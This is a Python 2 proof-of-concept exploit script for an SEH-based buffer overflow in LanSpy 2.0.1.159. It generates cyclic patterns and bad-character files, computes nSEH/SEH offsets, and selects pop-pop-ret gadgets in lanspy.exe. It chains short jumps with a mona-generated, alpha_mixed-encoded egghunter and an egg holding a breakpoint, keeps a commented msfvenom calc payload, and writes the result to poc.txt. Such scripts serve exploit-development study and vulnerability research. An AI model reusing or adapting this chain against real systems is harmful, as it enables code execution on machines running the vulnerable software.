#!/usr/bin/env python

import struct

def pattern_create(length = 8192):
    pattern = ''
    parts = ['A', 'a', '0']
    try:
        if not isinstance(length, (int, long)) and length.startswith('0x'):
            length = int(length, 16)
        elif not isinstance(length, (int, long)):
            length = int(length, 10)
    except ValueError:
        print 'ValueError'
        sys.exit(254)
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

def pattern_offset(value, length = 8192):
    try:
        if value.startswith('0x'):
            value = struct.pack('<I', int(value, 16)).strip('\x00')
    except ValueError:
        print 'ValueError'
        sys.exit(254)
    pattern = pattern_create(length)
    try:
        return pattern.index(value)
    except ValueError:
        return 'Not found'

def generate_badchars(avoid = ''):
    badchars = ''
    badchars_print = ''
    for i in range(0x20, 255):
        if not chr(i) in avoid:
            badchars += chr(i)
            badchars_print += '\\x' + hex(i)[2:].rjust(2, '0')
    print "generated badchars:"
    print badchars_print
    return badchars

crash = pattern_create(1024)

print 'generating crash.txt.. [size: %d]' % len(crash)
f = open('crash.txt', 'w')
f.write(crash)
f.close()

# badchars = generate_badchars('\x00\x01\x02\x0a\x0d\x20,;.:!"#$%&\'()*+-/<=>?@')
badchars = generate_badchars('\x00\x01\x02\x0a\x0d\x20,;.:!"#$%&\'()*+-/<=>?@')
badchars_crash = badchars + crash[len(badchars):]

print 'generating badchars.txt.. [size: %d]' % len(badchars)
f = open('badchars.txt', 'w')
f.write(badchars)
f.close()

print 'generating badchars_crash.txt.. [size: %d]' % len(badchars_crash)
f = open('badchars_crash.txt', 'w')
f.write(badchars_crash)
f.close()

nSEH_offset = pattern_offset('0x41387741')
print 'nSEH @ %d' % nSEH_offset # 684
jmp1_offset = pattern_offset('Av1A')
print 'jmp1 @ %d' % jmp1_offset # 633
jmp2_offset = pattern_offset('8An9')
print 'jmp2 @ %d' % jmp2_offset # 416
# nSEH = '\x75\x9b\x74\x9b' # jne $-99; je $-99;
# nSEH = '\x75\xbd\x74\xbd' # ===BADCHARS===> jne \x75\x9c\x74\x9c
# nSEH = '\x75\x90\x74\x90'
# nSEH = '\x75\x41\x74\x41'
nSEH = '\x75\xcb\x74\xc9' # jne $-51; je $-53; # jmp to pattern not corrupted after seh
# SEH = '\xc3\x71\x40\x00' # 0x004071c3 : pop ecx # pop ebp # ret 0x04 | startnull {PAGE_EXECUTE_READ} [lanspy.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.1.159 (C:\Program Files (x86)\LizardSystems\LanSpy\lanspy.exe)
# SEH = '\x58\x92\x41\x00' # 0x00419258 : pop ecx # pop ebp # ret 0x04 | startnull {PAGE_EXECUTE_READ} [lanspy.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.1.159 (C:\Program Files (x86)\LizardSystems\LanSpy\lanspy.exe)
# SEH = '\xfe\x13\x46\x00' # 0x004613fe : pop ecx # pop ebp # ret 0x04 | startnull {PAGE_EXECUTE_READ} [lanspy.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.1.159 (C:\Program Files (x86)\LizardSystems\LanSpy\lanspy.exe)
# SEH = '\x21\x19\x45\x00' # 0x00451921 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [lanspy.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.1.159 (C:\Program Files (x86)\LizardSystems\LanSpy\lanspy.exe)
# SEH = '\x48\x81\x45\x00' # 0x00458148 - taken from original exploit
SEH = '\x3f\x51\x43\x00' # 0x0043513f : pop ecx # pop ebp # ret  | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [lanspy.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.1.159 (C:\Program Files (x86)\LizardSystems\LanSpy\lanspy.exe)

# stage1 = '\xcc\xcc\xcc\xcc' # TODO
# metasm > jmp $-217
stage1 = "\xe9\x22\xff\xff\xff"

# stage2 = '\xcc\xcc\xcc\xcc' # TODO
stage2 = "\x90\x90\x90\x90" # pad to align
# stage2 += badchars # 

# bash build-egghunter.sh
# Attempting to read payload from STDIN...
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/alpha_mixed
# x86/alpha_mixed succeeded with size 158 (iteration=0)
# x86/alpha_mixed chosen with final size 158
# Payload size: 158 bytes
# Final size of python file: 842 bytes
stage2 += "\x89\xe7\xda\xc9\xd9\x77\xf4\x58\x50\x59\x49\x49"
stage2 += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
stage2 += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
stage2 += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
stage2 += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
stage2 += "\x45\x61\x69\x4b\x44\x71\x7a\x72\x31\x43\x62\x73"
stage2 += "\x61\x43\x43\x63\x58\x33\x4f\x30\x72\x46\x4e\x61"
stage2 += "\x49\x5a\x59\x6f\x36\x6f\x53\x72\x53\x62\x61\x7a"
stage2 += "\x65\x76\x62\x78\x50\x31\x49\x59\x6e\x69\x79\x72"
stage2 += "\x35\x34\x49\x6f\x44\x53\x31\x4e\x61\x4a\x35\x6c"
stage2 += "\x35\x55\x34\x34\x4a\x49\x68\x38\x53\x47\x30\x30"
stage2 += "\x64\x70\x62\x54\x6b\x39\x48\x57\x6c\x6f\x64\x35"
stage2 += "\x48\x64\x6c\x6f\x71\x65\x6b\x51\x59\x6f\x79\x77"
stage2 += "\x41\x41"


# Log data
# Address    Message
# 0BADF00D   [+] Command used:
# 0BADF00D   !mona egghunter -wow64 -winver 7
# 0BADF00D   [+] Egg set to w00t
# 0BADF00D   [+] Generating egghunter for wow64, Windows 7
# 0BADF00D   [+] Preparing output file 'egghunter.txt'
# 0BADF00D       - (Re)setting logfile egghunter.txt
# 0BADF00D   [+] Egghunter  (46 bytes):
# stage2 += "\x31\xdb\x53\x53\x53\x53\xb3\xc0\x66\x81\xca\xff\x0f\x42\x52\x6a"
# stage2 += "\x26\x58\x33\xc9\x8b\xd4\x64\xff\x13\x5e\x5a\x3c\x05\x74\xe9\xb8"
# stage2 += "\x77\x30\x30\x74\x8b\xfa\xaf\x75\xe4\xaf\x75\xe1\xff\xe7"
# 
# 0BADF00D
# 0BADF00D   [+] This mona.py action took 0:00:00.032000

# echo -ne '\\x31\\xdb\\x53\\x53\\x53\\x53\\xb3\\xc0\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x26\\x58\\x33\\xc9\\x8b\\xd4\\x64\\xff\\x13\\x5e\\x5a\\x3c\\x05\\x74\\xe9\\xb8\\x77\\x30\\x30\\x74\\x8b\\xfa\\xaf\\x75\\xe4\\xaf\\x75\\xe1\\xff\\xe7' | msfvenom -p- --arch x86 --platform windows -e x86/alpha_mixed -f python -v stage2
# Attempting to read payload from STDIN...
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/alpha_mixed
# x86/alpha_mixed succeeded with size 154 (iteration=0)
# x86/alpha_mixed chosen with final size 154
# Payload size: 154 bytes
# Final size of python file: 812 bytes
# stage2 += "\x89\xe2\xda\xc8\xd9\x72\xf4\x58\x50\x59\x49\x49"
# stage2 += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
# stage2 += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
# stage2 += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
# stage2 += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
# stage2 += "\x66\x51\x4b\x6b\x73\x63\x53\x63\x76\x33\x42\x73"
# stage2 += "\x58\x33\x69\x50\x61\x76\x4b\x31\x69\x5a\x6b\x4f"
# stage2 += "\x56\x6f\x33\x72\x52\x72\x43\x5a\x75\x76\x66\x38"
# stage2 += "\x46\x53\x78\x49\x6e\x6b\x4a\x74\x32\x44\x69\x6f"
# stage2 += "\x64\x53\x31\x4e\x72\x7a\x45\x6c\x63\x35\x32\x54"
# stage2 += "\x69\x79\x6d\x68\x52\x57\x56\x50\x74\x70\x61\x64"
# stage2 += "\x4c\x4b\x68\x7a\x4c\x6f\x74\x35\x68\x64\x6c\x6f"
# stage2 += "\x30\x75\x49\x71\x6b\x4f\x69\x77\x41\x41"


egg =  "w00tw00t"
egg += "\x81\xe4\xf0\xff\xff\xff" # and esp, 0xfffffff0 ; align stack
egg += "\xcc\xcc\xcc\xcc"
# egg += badchars
# msfvenom -p windows/exec CMD=calc --arch x86 --platform windows -e x86/alpha_mixed -b '\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f' -f python -v egg
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/alpha_mixed
# x86/alpha_mixed succeeded with size 440 (iteration=0)
# x86/alpha_mixed chosen with final size 440
# Payload size: 440 bytes
# Final size of python file: 2145 bytes
# egg += "\x89\xe3\xd9\xc1\xd9\x73\xf4\x5d\x55\x59\x49\x49\x49"
# egg += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
# egg += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
# egg += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
# egg += "\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x6a\x48\x6e"
# egg += "\x62\x65\x50\x55\x50\x43\x30\x45\x30\x4c\x49\x5a\x45"
# egg += "\x65\x61\x6b\x70\x53\x54\x4c\x4b\x76\x30\x44\x70\x4c"
# egg += "\x4b\x72\x72\x46\x6c\x4e\x6b\x32\x72\x62\x34\x4c\x4b"
# egg += "\x53\x42\x46\x48\x76\x6f\x68\x37\x32\x6a\x61\x36\x70"
# egg += "\x31\x6b\x4f\x6c\x6c\x47\x4c\x61\x71\x61\x6c\x67\x72"
# egg += "\x44\x6c\x75\x70\x79\x51\x48\x4f\x34\x4d\x63\x31\x4f"
# egg += "\x37\x4a\x42\x59\x62\x62\x72\x30\x57\x4e\x6b\x31\x42"
# egg += "\x32\x30\x6c\x4b\x33\x7a\x55\x6c\x4c\x4b\x42\x6c\x66"
# egg += "\x71\x42\x58\x4b\x53\x30\x48\x77\x71\x38\x51\x53\x61"
# egg += "\x4e\x6b\x50\x59\x47\x50\x36\x61\x5a\x73\x4c\x4b\x42"
# egg += "\x69\x32\x38\x49\x73\x55\x6a\x50\x49\x6c\x4b\x55\x64"
# egg += "\x6c\x4b\x63\x31\x5a\x76\x45\x61\x79\x6f\x4c\x6c\x6b"
# egg += "\x71\x78\x4f\x54\x4d\x77\x71\x69\x57\x76\x58\x4b\x50"
# egg += "\x71\x65\x38\x76\x75\x53\x73\x4d\x39\x68\x47\x4b\x51"
# egg += "\x6d\x66\x44\x44\x35\x4d\x34\x53\x68\x4e\x6b\x70\x58"
# egg += "\x45\x74\x66\x61\x6e\x33\x75\x36\x6e\x6b\x36\x6c\x32"
# egg += "\x6b\x4c\x4b\x33\x68\x75\x4c\x45\x51\x4e\x33\x6e\x6b"
# egg += "\x47\x74\x4c\x4b\x75\x51\x48\x50\x4b\x39\x70\x44\x45"
# egg += "\x74\x74\x64\x31\x4b\x63\x6b\x55\x31\x63\x69\x63\x6a"
# egg += "\x36\x31\x6b\x4f\x59\x70\x61\x4f\x73\x6f\x51\x4a\x4c"
# egg += "\x4b\x76\x72\x4a\x4b\x6e\x6d\x51\x4d\x43\x5a\x75\x51"
# egg += "\x6e\x6d\x6d\x55\x4d\x62\x35\x50\x53\x30\x45\x50\x66"
# egg += "\x30\x63\x58\x55\x61\x4e\x6b\x70\x6f\x4c\x47\x4b\x4f"
# egg += "\x4e\x35\x6d\x6b\x78\x70\x68\x35\x6c\x62\x43\x66\x53"
# egg += "\x58\x79\x36\x4f\x65\x4f\x4d\x4d\x4d\x4b\x4f\x6a\x75"
# egg += "\x65\x6c\x44\x46\x51\x6c\x35\x5a\x4f\x70\x69\x6b\x6d"
# egg += "\x30\x30\x75\x46\x65\x6d\x6b\x57\x37\x57\x63\x42\x52"
# egg += "\x50\x6f\x51\x7a\x43\x30\x56\x33\x59\x6f\x59\x45\x55"
# egg += "\x33\x50\x61\x42\x4c\x72\x43\x37\x70\x41\x41"

# payload = 'A' * nSEH_offset
payload = egg
payload += pattern_create(jmp2_offset - len(payload))
payload += stage2
payload += 'B' * (jmp1_offset - len(payload))
payload += stage1
payload += 'C' * (nSEH_offset - len(payload))
# payload += '' # EIP
payload += nSEH
payload += SEH
payload += 'D' * (1024 - len(payload))

print 'generating poc.txt.. [size: %d]' % len(payload)
f = open('poc.txt', 'w')
f.write(payload)
f.close()
